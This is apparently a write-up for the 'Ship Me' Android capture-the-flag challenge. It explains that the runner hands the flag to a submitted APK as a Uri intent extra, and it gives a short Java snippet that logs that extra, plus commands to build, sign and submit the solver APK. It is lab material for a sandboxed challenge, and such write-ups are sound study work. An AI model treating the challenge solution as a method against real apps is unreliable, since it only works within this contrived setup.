# Ship Me — Writeup

## Recon

The runner installs the challenge APK and then launches the submitted
solution APK. The flag is delivered as a `Uri` extra named `package`:

```text
shipme://cargo/?name=TFCCTF{...}&origin=challenge
```

The challenge documentation shows the same extra with:

```text
--eu package 'shipme://cargo/?name=FAKE_FLAG_HERE&origin=challenge'
```

The key Android detail is that `--eu` creates a `Uri` Parcelable extra; it is
not a string extra.

## Exploit

The submitted APK does not need to replace `me.ship`. Replacing it causes an
install/signature collision because the challenge APK is already installed.
Use a separate package (`com.exploit.shipme`) and read the incoming intent in
its launcher activity:

```java
private void dumpCargo(Intent intent) {
    if (intent == null) return;
    Uri uri = intent.getParcelableExtra("package", Uri.class);
    if (uri != null) {
        Log.i("TFCCTF", "cargo: " + uri);
    }
}
```

The platform filters session output for the `TFCCTF` tag. The flag is already
inside `uri.toString()`, so the solver only needs to extract `TFCCTF{...}` from
the session logs.

Local validation used the same runner command with a fake value and captured:

```text
I/TFCCTF: cargo: shipme://cargo/?name=TFCCTF{CUSTOM_LOCAL_TEST}
```

## Build and verify

The build script creates the attacker APK, signs it, and aligns it:

```bash
python3 build_and_solve.py
apksigner verify --verbose exploit_aligned.apk
aapt2 dump badging exploit_aligned.apk | head
```

The package must be `com.exploit.shipme`; do not submit the patched
`shipme-exploit-aligned.apk`, which keeps package `me.ship` and is rejected by
the platform install step.

## Solver

```bash
python3 solver/solve.py "$ANDROID_KOTH_TOKEN"
```

`solver/solve.py` uploads `exploit_aligned.apk`, polls
`/session/<id>/logs`, and extracts the first flag-shaped value. The token is
supplied at runtime rather than documented here.

## Flag

Pending the successful remote session capture.
